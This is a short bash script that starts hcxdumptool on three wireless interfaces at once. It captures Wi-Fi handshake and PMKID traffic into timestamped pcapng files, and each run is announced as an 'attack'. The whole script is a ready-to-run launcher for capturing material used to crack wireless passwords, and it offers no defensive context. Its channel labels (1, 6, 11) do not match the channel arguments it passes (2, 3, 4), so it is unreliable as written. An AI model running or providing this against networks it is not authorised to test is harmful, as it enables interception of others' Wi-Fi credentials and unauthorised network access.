#!/bin/bash
now=$(date --iso-8601=ns)
echo 'Starting Ch1 attack'
sudo hcxdumptool -i wlan0 -o $now.pcapng -c 2&
now=$(date --iso-8601=ns)
echo 'Starting Ch6 attack'
sudo hcxdumptool -i wlan1 -o $now.pcapng -c 3&
now=$(date --iso-8601=ns)
echo 'Starting Ch11 attack'
sudo hcxdumptool -i wlan2 -o $now.pcapng -c 4&
sleep 5
echo 'Off to the races'
ps ax|grep hcx
